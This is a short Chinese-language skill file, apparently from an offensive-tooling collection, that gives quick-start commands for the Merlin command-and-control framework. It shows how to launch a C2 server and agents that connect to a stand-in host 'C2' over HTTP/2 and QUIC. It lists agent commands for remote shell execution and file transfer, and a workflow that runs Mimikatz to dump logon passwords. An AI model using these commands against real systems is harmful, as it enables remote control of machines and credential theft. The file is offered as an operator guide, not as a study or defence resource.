---
name: "merlin"
description: ">"
---

# Merlin

*Sourced from killvxk-malskills-zh*

# Merlin

跨平台 C2 (命令与控制) 框架，使用 HTTP/2 和 HTTP/3 (QUIC) — Go 服务端 + 多操作系统 Agent。

## 快速开始

```bash
# 从 https://github.com/Ne0nd0g/merlin/releases 下载

# 启动服务端（HTTPS/HTTP2，监听 443）
./merlinServer-Linux-x64 -i 0.0.0.0 -p 443 -x509cert server.crt -x509key server.key

# 生成 Agent
./merlinAgent-Linux-x64 -url https://C2:443/ -psk "passphrase"
```

## 服务端命令

| 命令 | 用途 |
|---------|---------|
| `sessions` | 列出已连接的 Agent |
| `interact <UUID>` | 进入 Agent 会话 |
| `use module <path>` | 加载模块 |
| `upload <src> <dst>` | 上传文件到 Agent |
| `download <src>` | 从 Agent 下载文件 |
| `shell <cmd>` | 执行系统命令 |
| `exit` | 终止 Agent |

## 常见工作流

**HTTP/3 QUIC 监听器：**
```bash
./merlinServer-Linux-x64 -proto h3 -i 0.0.0.0 -p 8443
./merlinAgent-Windows-x64.exe -url https://C2:8443/ -proto h3 -psk "passphrase"
```

**通过 Merlin 模块使用 Mimikatz：**
```
interact <UUID>
use module windows/credentials/mimikatz/logonpasswords
run
```

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | 传输选项和 Agent 编译参数 |

